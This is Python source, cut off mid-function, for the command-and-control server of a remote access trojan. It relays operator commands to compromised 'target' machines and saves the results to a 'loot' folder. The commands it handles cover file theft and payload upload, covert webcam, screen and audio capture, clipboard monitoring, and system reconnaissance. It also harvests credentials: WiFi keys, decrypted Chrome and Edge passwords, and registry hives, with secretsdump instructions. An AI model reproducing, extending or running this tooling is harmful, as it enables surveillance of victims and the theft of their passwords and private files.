import asyncio
import ssl
import websockets
import json
import hashlib
import secrets
import argparse
import sys
import base64
import os
import time
from pathlib import Path

CREDS_FILE = "credentials.json"
LOOT_DIR = "loot"
PAYLOADS_DIR = "payloads"

targets = {}
active_relays = {}  # Stores active relay tasks by target_id

def ensure_directories():
    """Creates the loot and payloads directories if they do not exist"""
    Path(LOOT_DIR).mkdir(exist_ok=True)
    Path(PAYLOADS_DIR).mkdir(exist_ok=True)
    print(f"[+] Directories ready: {LOOT_DIR}/, {PAYLOADS_DIR}/")

def hash_password(password: str, salt: bytes = None) -> tuple:
    """Hashing a password using PBKDF2-SHA256"""
    if salt is None:
        salt = secrets.token_bytes(32)
    
    key = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        100000
    )
    
    return key.hex(), salt.hex()

def verify_password(password: str, stored_hash: str, salt: str) -> bool:
    """Check a password against its hash"""
    try:
        key, _ = hash_password(password, bytes.fromhex(salt))
        return secrets.compare_digest(key, stored_hash)
    except Exception:
        return False

def load_credentials() -> dict:
    """Load credentials from the JSON file"""
    if not Path(CREDS_FILE).exists():
        return {}
    
    try:
        with open(CREDS_FILE, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"[ERROR] Failed to load credentials: {e}")
        return {}

def save_credentials(creds: dict):
    """Save the credentials to the JSON file"""
    try:
        with open(CREDS_FILE, 'w') as f:
            json.dump(creds, f, indent=2)
        print(f"[+] Credentials saved to {CREDS_FILE}")
    except Exception as e:
        print(f"[ERROR] Failed to save credentials: {e}")
        sys.exit(1)

def add_credential(role: str, login: str, password: str):
    """Add or update a credential"""
    creds = load_credentials()
    
    if role not in creds:
        creds[role] = {}
    
    pwd_hash, salt = hash_password(password)
    
    creds[role][login] = {
        "hash": pwd_hash,
        "salt": salt
    }
    
    save_credentials(creds)
    print(f"[+] Added/Updated {role}: {login}")

async def authenticate(role: str, credentials: str) -> tuple:
    """
    Authenticates a client using the login::password format
    Return (success: bool, login: str)
    """
    try:
        if "::" not in credentials:
            return False, None
        
        login, password = credentials.split("::", 1)
        
        creds = load_credentials()
        
        if role not in creds or login not in creds[role]:
            await asyncio.sleep(0.1)
            return False, None
        
        stored = creds[role][login]
        
        if verify_password(password, stored["hash"], stored["salt"]):
            return True, login
        else:
            await asyncio.sleep(0.1)
            return False, None
            
    except Exception as e:
        print(f"[AUTH ERROR] {e}")
        return False, None

async def relay(ws_from, ws_to, name):
    """Relays messages between two WebSockets"""
    try:
        async for message in ws_from:
            await ws_to.send(message)
    except websockets.exceptions.ConnectionClosed:
        print(f"[INFO] {name} relay closed")
    except Exception as e:
        print(f"[RELAY ERROR {name}] {e}")

async def handler(websocket):
    client_addr = websocket.remote_address
    
    try:
        # 1. Receive the identification message
        msg = await asyncio.wait_for(websocket.recv(), timeout=10.0)
        
        if ":" not in msg:
            await websocket.send("Invalid format. Expected: role:id::login::password")
            return
        
        parts = msg.split(":", 1)
        if len(parts) != 2:
            await websocket.send("Invalid format")
            return
        
        role = parts[0]
        remainder = parts[1]
        
        if "::" not in remainder:
            await websocket.send("Invalid format. Missing credentials (::login::password)")
            return
        
        client_id, credentials = remainder.split("::", 1)
        
        # 2. Authentication
        authenticated, login = await authenticate(role, credentials)
        
        if not authenticated:
            await websocket.send("Authentication failed")
            print(f"[!] Failed auth attempt from {client_addr} (role={role}, id={client_id})")
            return
        
        print(f"[+] Authenticated: {role}/{client_id} as {login}")
        
        # 3. Role-based logic
        if role == "target":
            print(f"[+] Target {client_id} ({login}) connected from {client_addr}")
            
            if client_id in targets:
                print(f"[WARNING] Replacing existing target {client_id}")
            
            targets[client_id] = websocket
            await websocket.send("Authentication successful. Waiting for commands...")
            
            try:
                await websocket.wait_closed()
            finally:
                targets.pop(client_id, None)
                print(f"[-] Target {client_id} ({login}) disconnected")
        
        elif role == "operator":
            print(f"[+] Operator {client_id} ({login}) connected from {client_addr}")
            
            # Send the list of connected targets
            if targets:
                target_list = list(targets.keys())
                # Format: TARGET_LIST:target1,target2,target3
                targets_msg = "TARGET_LIST:" + ",".join(target_list)
                await websocket.send(targets_msg)
            else:
                await websocket.send("TARGET_LIST:")  # Empty list
            
            # Get the target's ID (which can be a number or a name)
            target_id = await asyncio.wait_for(websocket.recv(), timeout=30.0)
            print(f"[DEBUG] Operator {login} requested target: {target_id}")
            
            if target_id not in targets:
                await websocket.send(f"Target '{target_id}' not found. Available: {list(targets.keys())}")
                return
            
            target_ws = targets[target_id]
            await websocket.send(f"Connected to target '{target_id}'")
            
            # Cancel any existing old relays
            if target_id in active_relays:
                print(f"[INFO] Cleaning up old relays for {target_id}")
                for task in active_relays[target_id]:
                    task.cancel()
                try:
                    await asyncio.gather(*active_relays[target_id], return_exceptions=True)
                except:
                    pass
                active_relays[target_id] = []
            
            # Dictionary for storing the expected responses to FILE_ commands
            pending_file_responses = {}
            
            # Bidirectional relay with FILE_ command interception
            async def relay_operator_to_target(ws_from, ws_to, name):
                """Relay operator → target with FILE_ interception"""
                try:
                    async for message in ws_from:
                        if message.startswith("FILE_DOWNLOAD:"):
                            # Extract the filename
                            filename = message.split(":", 1)[1]
                            
                            # Generate a unique ID for this request
                            request_id = f"dl_{id(message)}"
                            
                            # Create an event to wait for a response
                            response_event = asyncio.Event()
                            pending_file_responses[request_id] = {
                                'event': response_event,
                                'response': None,
                                'filename': filename
                            }
                            
                            # Send the DOWNLOAD command to the target
                            await ws_to.send(f"DOWNLOAD:{filename}")
                            print(f"[FILE] Requesting {filename} from {target_id}")
                            
                            # Wait for the response (to be filled in by the other relay)
                            try:
                                await asyncio.wait_for(response_event.wait(), timeout=60.0)
                                response = pending_file_responses[request_id]['response']
                                
                                # Process the response
                                if response.startswith("FILE_DATA:"):
                                    parts = response.split(":", 2)
                                    if len(parts) == 3:
                                        _, recv_filename, b64_data = parts
                                        
                                        import base64
                                        from pathlib import Path
                                        file_data = base64.b64decode(b64_data)
                                        
                                        safe_filename = f"{target_id}_{recv_filename}"
                                        filepath = Path(LOOT_DIR) / safe_filename
                                        
                                        with open(filepath, 'wb') as f:
                                            f.write(file_data)
                                        
                                        size_kb = len(file_data) / 1024
                                        print(f"[FILE] Downloaded {recv_filename} ({size_kb:.2f} KB) from {target_id} → {filepath}")
                                        await ws_from.send(f"[✓] Downloaded {recv_filename} ({size_kb:.2f} KB) → {filepath}")
                                    else:
                                        await ws_from.send(f"[✗] Invalid file data format")
                                
                                elif response.startswith("FILE_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[FILE] Error from {target_id}: {error_msg}")
                                    await ws_from.send(f"[✗] {error_msg}")
                                
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout waiting for file")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        elif message.startswith("FILE_UPLOAD:"):
                            # Upload file
                            filename = message.split(":", 1)[1]
                            from pathlib import Path
                            filepath = Path(PAYLOADS_DIR) / filename
                            
                            if not filepath.exists():
                                await ws_from.send(f"[✗] File not found: {filepath}")
                                print(f"[FILE] File not found: {filepath}")
                                continue
                            
                            import base64
                            with open(filepath, 'rb') as f:
                                file_data = f.read()
                            
                            b64_data = base64.b64encode(file_data).decode('utf-8')
                            size_kb = len(file_data) / 1024
                            
                            # Create an event to wait for confirmation
                            request_id = f"ul_{id(message)}"
                            response_event = asyncio.Event()
                            pending_file_responses[request_id] = {
                                'event': response_event,
                                'response': None
                            }
                            
                            await ws_to.send(f"UPLOAD:{filename}:{b64_data}")
                            print(f"[FILE] Uploading {filename} ({size_kb:.2f} KB) to {target_id}")
                            
                            try:
                                await asyncio.wait_for(response_event.wait(), timeout=60.0)
                                response = pending_file_responses[request_id]['response']
                                
                                if response.startswith("FILE_OK:"):
                                    msg = response.split(":", 1)[1]
                                    print(f"[FILE] Upload successful: {msg}")
                                    await ws_from.send(f"[✓] {msg}")
                                elif response.startswith("FILE_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[FILE] Upload failed: {error_msg}")
                                    await ws_from.send(f"[✗] {error_msg}")
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout waiting for confirmation")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        elif message == "FILE_LIST_LOOT":
                            from pathlib import Path
                            files = list(Path(LOOT_DIR).iterdir())
                            if files:
                                file_list = "\n".join([f"  - {f.name} ({f.stat().st_size / 1024:.2f} KB)" for f in files])
                                await ws_from.send(f"Files in {LOOT_DIR}/:\n{file_list}")
                            else:
                                await ws_from.send(f"{LOOT_DIR}/ is empty")
                        
                        elif message == "FILE_LIST_PAYLOADS":
                            from pathlib import Path
                            files = list(Path(PAYLOADS_DIR).iterdir())
                            if files:
                                file_list = "\n".join([f"  - {f.name} ({f.stat().st_size / 1024:.2f} KB)" for f in files])
                                await ws_from.send(f"Files in {PAYLOADS_DIR}/:\n{file_list}")
                            else:
                                await ws_from.send(f"{PAYLOADS_DIR}/ is empty")
                        
                        elif message == "FILE_LIST_DOWNLOADS":
                            # Request target to list its downloads directory
                            request_id = f"ls_downloads_{id(message)}"
                            response_event = asyncio.Event()
                            pending_file_responses[request_id] = {
                                'event': response_event,
                                'response': None
                            }
                            
                            await ws_to.send("LIST_DOWNLOADS")
                            print(f"[FILE] Requesting downloads list from {target_id}")
                            
                            try:
                                await asyncio.wait_for(response_event.wait(), timeout=10.0)
                                response = pending_file_responses[request_id]['response']
                                
                                # Strip the response type prefix
                                if response.startswith("LIST_DOWNLOADS_OK:"):
                                    message_text = response.split(":", 1)[1]
                                    await ws_from.send(message_text)
                                elif response.startswith("LIST_DOWNLOADS_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    await ws_from.send(f"[✗] {error_msg}")
                                else:
                                    await ws_from.send(response)
                                    
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout listing downloads")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        elif message == "WEBCAM_CAPTURE":
                            # Webcam capture
                            request_id = f"webcam_{id(message)}"
                            response_event = asyncio.Event()
                            pending_file_responses[request_id] = {
                                'event': response_event,
                                'response': None
                            }
                            
                            await ws_to.send("WEBCAM_CAPTURE")
                            print(f"[WEBCAM] Requesting capture from {target_id}")
                            
                            try:
                                await asyncio.wait_for(response_event.wait(), timeout=30.0)
                                response = pending_file_responses[request_id]['response']
                                
                                if response.startswith("WEBCAM_DATA:"):
                                    parts = response.split(":", 2)
                                    if len(parts) == 3:
                                        _, recv_filename, b64_data = parts
                                        
                                        import base64
                                        from pathlib import Path
                                        from datetime import datetime
                                        
                                        image_data = base64.b64decode(b64_data)
                                        
                                        # Generate unique filename
                                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                        safe_filename = f"{target_id}_webcam_{timestamp}.jpg"
                                        filepath = Path(LOOT_DIR) / safe_filename
                                        
                                        with open(filepath, 'wb') as f:
                                            f.write(image_data)
                                        
                                        size_kb = len(image_data) / 1024
                                        print(f"[WEBCAM] Captured from {target_id} ({size_kb:.2f} KB) → {filepath}")
                                        await ws_from.send(f"[✓] Webcam captured ({size_kb:.2f} KB) → {filepath}")
                                    else:
                                        await ws_from.send(f"[✗] Invalid webcam data format")
                                
                                elif response.startswith("WEBCAM_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[WEBCAM] Error from {target_id}: {error_msg}")
                                    await ws_from.send(f"[✗] {error_msg}")
                            
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout waiting for webcam capture")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        elif message == "SCREENSHOT":
                            # Screenshot capture
                            request_id = f"screenshot_{id(message)}"
                            response_event = asyncio.Event()
                            pending_file_responses[request_id] = {
                                'event': response_event,
                                'response': None
                            }
                            
                            await ws_to.send("SCREENSHOT")
                            print(f"[SCREENSHOT] Requesting capture from {target_id}")
                            
                            try:
                                await asyncio.wait_for(response_event.wait(), timeout=30.0)
                                response = pending_file_responses[request_id]['response']
                                
                                if response.startswith("SCREENSHOT_DATA:"):
                                    parts = response.split(":", 2)
                                    if len(parts) == 3:
                                        _, recv_filename, b64_data = parts
                                        
                                        import base64
                                        from pathlib import Path
                                        from datetime import datetime
                                        
                                        image_data = base64.b64decode(b64_data)
                                        
                                        # Generate unique filename
                                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                        safe_filename = f"{target_id}_screenshot_{timestamp}.png"
                                        filepath = Path(LOOT_DIR) / safe_filename
                                        
                                        with open(filepath, 'wb') as f:
                                            f.write(image_data)
                                        
                                        size_kb = len(image_data) / 1024
                                        print(f"[SCREENSHOT] Captured from {target_id} ({size_kb:.2f} KB) → {filepath}")
                                        await ws_from.send(f"[✓] Screenshot captured ({size_kb:.2f} KB) → {filepath}")
                                    else:
                                        await ws_from.send(f"[✗] Invalid screenshot data format")
                                
                                elif response.startswith("SCREENSHOT_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[SCREENSHOT] Error from {target_id}: {error_msg}")
                                    await ws_from.send(f"[✗] {error_msg}")
                            
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout waiting for screenshot")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        elif message == "STREAM_START":
                            # Start desktop streaming
                            await ws_to.send("STREAM_START")
                            print(f"[STREAM] Starting stream from {target_id}")
                            await ws_from.send(f"[*] Desktop stream started from {target_id}")
                        
                        elif message == "STREAM_STOP":
                            # Stop desktop streaming
                            await ws_to.send("STREAM_STOP")
                            print(f"[STREAM] Stopping stream from {target_id}")
                            await ws_from.send(f"[*] Desktop stream stopped")
                        
                        elif message.startswith("AUDIO_RECORD:"):
                            # Audio recording
                            duration = message.split(":", 1)[1]
                            request_id = f"audio_{id(message)}"
                            response_event = asyncio.Event()
                            pending_file_responses[request_id] = {
                                'event': response_event,
                                'response': None
                            }
                            
                            await ws_to.send(f"AUDIO_RECORD:{duration}")
                            print(f"[AUDIO] Requesting {duration}s recording from {target_id}")
                            
                            try:
                                # Longer timeout for audio recording (duration + 30s buffer)
                                timeout = int(duration) + 30
                                await asyncio.wait_for(response_event.wait(), timeout=timeout)
                                response = pending_file_responses[request_id]['response']
                                
                                if response.startswith("AUDIO_DATA:"):
                                    parts = response.split(":", 2)
                                    if len(parts) == 3:
                                        _, recv_filename, b64_data = parts
                                        
                                        import base64
                                        from pathlib import Path
                                        from datetime import datetime
                                        
                                        audio_data = base64.b64decode(b64_data)
                                        
                                        # Generate unique filename
                                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                        safe_filename = f"{target_id}_audio_{timestamp}.wav"
                                        filepath = Path(LOOT_DIR) / safe_filename
                                        
                                        with open(filepath, 'wb') as f:
                                            f.write(audio_data)
                                        
                                        size_kb = len(audio_data) / 1024
                                        print(f"[AUDIO] Recorded from {target_id} ({size_kb:.2f} KB) → {filepath}")
                                        await ws_from.send(f"[✓] Audio recorded ({size_kb:.2f} KB) → {filepath}")
                                    else:
                                        await ws_from.send(f"[✗] Invalid audio data format")
                                
                                elif response.startswith("AUDIO_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[AUDIO] Error from {target_id}: {error_msg}")
                                    await ws_from.send(f"[✗] {error_msg}")
                            
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout waiting for audio recording")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        elif message.startswith("SEARCH_FILES:"):
                            # File search
                            request_id = f"search_{id(message)}"
                            response_event = asyncio.Event()
                            pending_file_responses[request_id] = {
                                'event': response_event,
                                'response': None
                            }
                            
                            # Forward to target
                            await ws_to.send(message)
                            search_params = message.split(":", 1)[1]
                            print(f"[SEARCH] Searching on {target_id}: {search_params}")
                            
                            try:
                                await asyncio.wait_for(response_event.wait(), timeout=120.0)
                                response = pending_file_responses[request_id]['response']
                                
                                if response.startswith("SEARCH_RESULTS:"):
                                    parts = response.split(":", 2)
                                    if len(parts) == 3:
                                        _, count, results_json = parts
                                        
                                        import json
                                        results = json.loads(results_json)
                                        
                                        print(f"[SEARCH] Found {count} results on {target_id}")
                                        
                                        if int(count) == 0:
                                            await ws_from.send(f"[!] No results found")
                                        else:
                                            # Display all results (not limited to 20)
                                            num_results = len(results)
                                            output = f"[✓] Found {count} results:\n"
                                            
                                            for i, result in enumerate(results, 1):
                                                if 'path' in result:
                                                    if 'line' in result:
                                                        output += f"  {i}. {result['path']}:{result['line']}\n"
                                                        output += f"     {result.get('content', '')}\n"
                                                    else:
                                                        size_kb = result.get('size', 0) / 1024
                                                        output += f"  {i}. {result['path']} ({size_kb:.2f} KB)\n"
                                            
                                            # If there are more results than displayed (due to limit on target side)
                                            if int(count) > num_results:
                                                output += f"  ... and {int(count) - num_results} more results (increase --limit to see more)"
                                            
                                            await ws_from.send(output)
                                    else:
                                        await ws_from.send(f"[✗] Invalid search results format")
                                
                                elif response.startswith("SEARCH_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[SEARCH] Error from {target_id}: {error_msg}")
                                    await ws_from.send(f"[✗] {error_msg}")
                            
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Search timeout")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        elif message == "SYSINFO_GATHER":
                            # System information
                            request_id = f"sysinfo_{id(message)}"
                            response_event = asyncio.Event()
                            pending_file_responses[request_id] = {
                                'event': response_event,
                                'response': None
                            }
                            
                            await ws_to.send("SYSINFO_GATHER")
                            print(f"[SYSINFO] Gathering from {target_id}")
                            
                            try:
                                await asyncio.wait_for(response_event.wait(), timeout=30.0)
                                response = pending_file_responses[request_id]['response']
                                
                                if response.startswith("SYSINFO_DATA:"):
                                    info_json = response.split(":", 1)[1]
                                    
                                    import json
                                    info = json.loads(info_json)
                                    
                                    print(f"[SYSINFO] Received from {target_id}")
                                    
                                    # Format output
                                    output = f"[✓] System Information - {target_id}\n\n"
                                    
                                    # SYSTEM
                                    if 'system' in info:
                                        output += "═══ SYSTEM ═══\n"
                                        for key, val in info['system'].items():
                                            output += f"{key.replace('_', ' ').title()}: {val}\n"
                                        output += "\n"
                                    
                                    # USER
                                    if 'user' in info:
                                        output += "═══ CURRENT USER ═══\n"
                                        for key, val in info['user'].items():
                                            if key == 'is_admin':
                                                output += f"Administrator/Root: {'YES' if val else 'NO'}\n"
                                            elif key == 'groups':
                                                output += f"Groups: {', '.join(val) if isinstance(val, list) else val}\n"
                                            else:
                                                output += f"{key.replace('_', ' ').title()}: {val}\n"
                                        output += "\n"
                                    
                                    # ALL USERS
                                    if 'users' in info and info['users']:
                                        output += "═══ ALL USERS ═══\n"
                                        if 'count' in info['users']:
                                            output += f"Total: {info['users']['count']}\n"
                                        if 'local_users' in info['users']:
                                            users = info['users']['local_users']
                                            if isinstance(users, list):
                                                if len(users) > 0:
                                                    for i, user in enumerate(users[:15], 1):  # Show max 15
                                                        if isinstance(user, dict):
                                                            output += f"  {i}. {user.get('name', 'unknown')} (UID: {user.get('uid', '?')}, Shell: {user.get('shell', '?')})\n"
                                                        else:
                                                            output += f"  {i}. {user}\n"
                                                    if len(users) > 15:
                                                        output += f"  ... and {len(users) - 15} more\n"
                                        output += "\n"
                                    
                                    # NETWORK
                                    if 'network' in info:
                                        output += "═══ NETWORK ═══\n"
                                        for key, val in info['network'].items():
                                            if key == 'listening_ports':
                                                output += f"Listening Ports ({info['network'].get('listening_count', len(val))} total):\n"
                                                for port in val[:10]:
                                                    output += f"  - {port}\n"
                                            else:
                                                output += f"{key.replace('_', ' ').title()}: {val}\n"
                                        output += "\n"
                                    
                                    # SECURITY
                                    if 'security' in info and info['security']:
                                        output += "═══ SECURITY ═══\n"
                                        for key, val in info['security'].items():
                                            output += f"{key.replace('_', ' ').title()}: {val}\n"
                                        output += "\n"
                                    
                                    # PROCESSES
                                    if 'processes' in info and info['processes']:
                                        output += "═══ PROCESSES ═══\n"
                                        if 'total' in info['processes']:
                                            output += f"Total Running: {info['processes']['total']}\n"
                                        if 'security_related' in info['processes']:
                                            output += "Security-Related Processes:\n"
                                            for proc in info['processes']['security_related']:
                                                output += f"  - {proc}\n"
                                        output += "\n"
                                    
                                    # SOFTWARE
                                    if 'software' in info and info['software']:
                                        output += "═══ INSTALLED SOFTWARE ═══\n"
                                        for key, val in info['software'].items():
                                            if key == 'detected':
                                                output += "Detected Applications:\n"
                                                for app in val:
                                                    output += f"  - {app}\n"
                                            else:
                                                output += f"{key.replace('_', ' ').title()}: {val}\n"
                                        output += "\n"
                                    
                                    # STORAGE
                                    if 'storage' in info:
                                        output += "═══ STORAGE ═══\n"
                                        if isinstance(info['storage'], list):
                                            for disk in info['storage']:
                                                if 'drive' in disk:
                                                    output += f"{disk['drive']}: {disk.get('free_gb', 0)}GB free / {disk.get('total_gb', 0)}GB total\n"
                                                elif 'mount' in disk:
                                                    output += f"{disk['mount']}: {disk.get('free_gb', 0)}GB free / {disk.get('total_gb', 0)}GB total\n"
                                        elif isinstance(info['storage'], dict) and 'error' in info['storage']:
                                            output += f"Error: {info['storage']['error']}\n"
                                        output += "\n"
                                    
                                    # DOMAIN
                                    if 'domain' in info and info['domain']:
                                        output += "═══ DOMAIN INFO ═══\n"
                                        for key, val in info['domain'].items():
                                            output += f"{key.replace('_', ' ').title()}: {val}\n"
                                        output += "\n"
                                    
                                    # VIRTUALIZATION
                                    if 'virtualization' in info and info['virtualization']:
                                        output += "═══ VIRTUALIZATION ═══\n"
                                        if info['virtualization'].get('detected'):
                                            output += f"VM Detected: YES ({info['virtualization'].get('type', 'Unknown')})\n"
                                        else:
                                            output += "VM Detected: NO (Physical machine or undetected)\n"
                                        output += "\n"
                                    
                                    # SCHEDULED TASKS
                                    if 'scheduled_tasks' in info and info['scheduled_tasks']:
                                        output += "═══ SCHEDULED TASKS ═══\n"
                                        if 'count' in info['scheduled_tasks']:
                                            output += f"User Tasks: {info['scheduled_tasks']['count']}\n"
                                        if 'user_tasks' in info['scheduled_tasks']:
                                            for task in info['scheduled_tasks']['user_tasks'][:5]:
                                                output += f"  - {task}\n"
                                        if 'crontab' in info['scheduled_tasks']:
                                            output += "Crontab Entries:\n"
                                            for cron in info['scheduled_tasks']['crontab']:
                                                output += f"  - {cron}\n"
                                        output += "\n"
                                    
                                    await ws_from.send(output)
                                
                                elif response.startswith("SYSINFO_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[SYSINFO] Error from {target_id}: {error_msg}")
                                    await ws_from.send(f"[✗] {error_msg}")
                            
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout gathering system info")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        elif message.startswith("CLIPBOARD:"):
                            # Clipboard operations
                            request_id = f"clipboard_{id(message)}"
                            response_event = asyncio.Event()
                            pending_file_responses[request_id] = {
                                'event': response_event,
                                'response': None
                            }
                            
                            await ws_to.send(message)
                            action = message.split(":", 1)[1]
                            print(f"[CLIPBOARD] Operation on {target_id}")
                            
                            try:
                                await asyncio.wait_for(response_event.wait(), timeout=10.0)
                                response = pending_file_responses[request_id]['response']
                                
                                if response.startswith("CLIPBOARD_DATA:"):
                                    import base64
                                    b64_content = response.split(":", 1)[1]
                                    content = base64.b64decode(b64_content).decode('utf-8')
                                    
                                    print(f"[CLIPBOARD] Content from {target_id}: {content[:50]}...")
                                    await ws_from.send(f"[✓] Clipboard content:\n{content}")
                                
                                elif response.startswith("CLIPBOARD_OK:"):
                                    msg = response.split(":", 1)[1]
                                    print(f"[CLIPBOARD] {msg}")
                                    await ws_from.send(f"[✓] {msg}")
                                
                                elif response.startswith("CLIPBOARD_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[CLIPBOARD] Error from {target_id}: {error_msg}")
                                    await ws_from.send(f"[✗] {error_msg}")
                            
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout accessing clipboard")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        elif message.startswith("CLIPBOARD_MONITOR:"):
                            # Start clipboard monitoring
                            await ws_to.send(message)
                            await ws_from.send("[+] Monitoring clipboard...")
                            print(f"[CLIPBOARD_MONITOR] Started on {target_id}")
                            
                            # Monitoring will send updates asynchronously
                            # No need to wait for completion
                        
                        # Handler CREDS
                        elif message.startswith("CREDS:"):
                            request_id = str(time.time())
                            pending_file_responses[request_id] = {
                                'event': asyncio.Event(),
                                'response': None
                            }
                            
                            await ws_to.send(message)
                            
                            try:
                                await asyncio.wait_for(
                                    pending_file_responses[request_id]['event'].wait(),
                                    timeout=60.0  # 60s timeout for credential harvesting
                                )
                                
                                response = pending_file_responses[request_id]['response']
                                
                                if response.startswith("CREDS_DATA:"):
                                    # Format: CREDS_DATA:type:json_data
                                    parts = response.split(":", 2)
                                    if len(parts) == 3:
                                        _, cred_type, json_data = parts
                                        
                                        import json
                                        data = json.loads(json_data)
                                        
                                        print(f"[CREDS] Harvested {cred_type} from {target_id}")
                                        
                                        # Format output based on type
                                        output = f"[✓] Credential Harvesting - {cred_type.upper()}\n\n"
                                        
                                        if cred_type == "wifi":
                                            if 'wifi' in data and data['wifi']:
                                                output += f"WiFi Networks ({data.get('wifi_count', 0)} found):\n"
                                                for wifi in data['wifi']:
                                                    output += f"  SSID: {wifi['ssid']}\n"
                                                    output += f"  Password: {wifi['password']}\n\n"
                                            elif 'wifi_error' in data:
                                                output += f"Error: {data['wifi_error']}\n"
                                            else:
                                                output += "No WiFi credentials found\n"
                                        
                                        elif cred_type == "browsers":
                                            if 'browsers' in data:
                                                for browser, info in data['browsers'].items():
                                                    output += f"{browser.upper()}:\n"
                                                    if info.get('found'):
                                                        output += f"  Found: Yes\n"
                                                        output += f"  Count: {info.get('count', 'Unknown')}\n"
                                                        output += f"  Location: {info.get('location', 'N/A')}\n"
                                                    else:
                                                        output += f"  Found: No\n"
                                                    output += "\n"
                                                output += "Note: Actual password decryption requires additional tools\n"
                                            else:
                                                output += "No browser data found\n"
                                        
                                        elif cred_type == "applications":
                                            if 'applications' in data:
                                                for app, info in data['applications'].items():
                                                    output += f"{app.upper()}:\n"
                                                    if info.get('found'):
                                                        output += f"  Found: Yes\n"
                                                        if 'credentials' in info:
                                                            for cred in info['credentials']:
                                                                output += f"  - {cred}\n"
                                                        if 'sessions' in info:
                                                            output += f"  Sessions: {', '.join(info['sessions'])}\n"
                                                        if 'location' in info:
                                                            output += f"  Location: {info['location']}\n"
                                                        if 'note' in info:
                                                            output += f"  Note: {info['note']}\n"
                                                    else:
                                                        output += f"  Found: No\n"
                                                    output += "\n"
                                            else:
                                                output += "No application credentials found\n"
                                        
                                        elif cred_type in ["edge_decrypt", "chrome_decrypt"]:
                                            browser_name = data.get('browser', cred_type.replace('_decrypt', '')).upper()
                                            
                                            # Check for errors
                                            if 'error' in data:
                                                output += f"Error: {data['error']}\n"
                                                if 'note' in data:
                                                    output += f"Note: {data['note']}\n"
                                                if 'path' in data:
                                                    output += f"Path checked: {data['path']}\n"
                                            else:
                                                # Show summary
                                                output += f"Browser: {browser_name}\n"
                                                output += f"Total Passwords: {data.get('total', 0)}\n"
                                                output += f"  - Decrypted (v10/v11): {data.get('v10_v11_count', 0)}\n"
                                                output += f"  - App-Bound (v20): {data.get('v20_count', 0)}\n\n"
                                                
                                                # Show v20 warning if detected
                                                if data.get('v20_detected'):
                                                    output += "⚠️  " + data.get('v20_note', '') + "\n\n"
                                                
                                                # Show passwords
                                                if data.get('passwords'):
                                                    output += "="*60 + "\n"
                                                    output += "PASSWORDS\n"
                                                    output += "="*60 + "\n\n"
                                                    
                                                    for i, pwd in enumerate(data['passwords'], 1):
                                                        output += f"[{i}] {pwd['url']}\n"
                                                        output += f"    Username: {pwd['username']}\n"
                                                        output += f"    Password: {pwd['password']}\n"
                                                        
                                                        # Show version for debugging
                                                        if pwd.get('version'):
                                                            output += f"    Version: {pwd['version']}\n"
                                                        
                                                        output += "\n"
                                                
                                                # Show v20 export help if needed
                                                if data.get('v20_export_help'):
                                                    output += "="*60 + "\n"
                                                    output += "v20 PASSWORD EXPORT INSTRUCTIONS\n"
                                                    output += "="*60 + "\n"
                                                    output += data['v20_export_help']
                                        
                                        elif cred_type == "registry_dump_vss":
                                            if 'error' in data:
                                                output += f"Error: {data['error']}\n"
                                                if 'note' in data:
                                                    output += f"Note: {data['note']}\n"
                                            elif data.get('success'):
                                                output += "╔════════════════════════════════════════════════════╗\n"
                                                output += "║  REGISTRY HIVES DUMPED VIA VSS                     ║\n"
                                                output += "╚════════════════════════════════════════════════════╝\n\n"
                                                
                                                output += f"Method: {data.get('method', 'VSS')}\n"
                                                output += f"Hives Dumped: {', '.join(data.get('hives_dumped', []))}\n"
                                                output += f"Total Hives: {data.get('hive_count', 0)}/3\n\n"
                                                
                                                if data.get('errors'):
                                                    output += "Errors:\n"
                                                    for error in data['errors']:
                                                        output += f"  ⚠️  {error}\n"
                                                    output += "\n"
                                                
                                                output += f"Filename: {data['filename']}\n"
                                                output += f"Location: {data['zip_file']}\n"
                                                output += f"Original Size: {data['original_size_mb']} MB\n"
                                                output += f"ZIP Size: {data['zip_size_mb']} MB\n"
                                                output += f"Compression: {data['compression_ratio']}%\n\n"
                                                
                                                output += f"💡 Download with:\n"
                                                output += f"   >>> download {data['filename']}\n\n"
                                                
                                                output += "🔓 Extract credentials with:\n"
                                                output += "   secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL\n\n"
                                                output += "Or use Impacket:\n"
                                                output += "   python3 secretsdump.py -sam SAM -system SYSTEM LOCAL\n"
                                        
                                        await ws_from.send(output)
                                
                                elif response.startswith("CREDS_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[CREDS] Error from {target_id}: {error_msg}")
